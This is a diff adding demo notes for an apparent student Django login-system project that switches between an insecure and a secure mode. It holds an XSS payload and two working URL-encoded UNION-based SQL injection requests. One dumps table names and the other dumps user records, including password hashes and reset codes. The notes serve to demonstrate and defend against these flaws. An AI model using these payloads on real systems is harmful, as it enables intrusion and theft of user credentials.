@@ -1,0 +1,20 @@
+Scenario:
+1. Register.
+2. Login.
+3. Password Restore.
+4. Client registartion.
+5. Mode Insecure. (SQLI + XSS) 
+<svg/onload=prompt(1)>
+**Show Attack using SQLI. Show that the attack does not work in secure mannaer.**
+
+6. Password Hashers HMAC + Salt. 
+**(Does the user need to be exposed to what hashers we use?)**
+git remote add origin https://github.com/OrrMey/Login-System
+git branch -M main
+git push -u origin main
+python manage.py runserver_plus --cert-file cert.pem --key-file key.pem --keep-meta-shutdown localhost:8000
+
+Table names
+https://localhost:8000/register/?username=test%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x76626571786f%2Ctable_name%29%29%2C0x71716b6271%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x636f6d6d6c7464%29--%20-&email=asdasd%40gmail.com&password=Asd34215%21&password_repeat=Asd34215%21&first_name=dordor&last_name=afargan&phone_number=0521721711&csrfmiddlewaretoken=MzTK0Pk7TtfAczHBosPgIfeIrjN9YIyAxBbBx5LGZFrHKi7Ish5pYFC57hh5TN1q
+Users data  table info
+https://localhost:8000/register/?username=test%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x76626571786f%2Cdate_joined%2Cemail%2Cfirst_name%2Cid%2Cis_active%2Cis_staff%2Cis_superuser%2ClastPasswords%2Clast_login%2Clast_name%2Cpassword%2CresetCode%2Cusername%29%29%2C0x71716b6271%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20commltd.users_usersdata--%20-&email=asdasd%40gmail.com&password=Asd34215%21&password_repeat=Asd34215%21&first_name=dordor&last_name=afargan&phone_number=0521721711&csrfmiddlewaretoken=MzTK0Pk7TtfAczHBosPgIfeIrjN9YIyAxBbBx5LGZFrHKi7Ish5pYFC57hh5TN1q
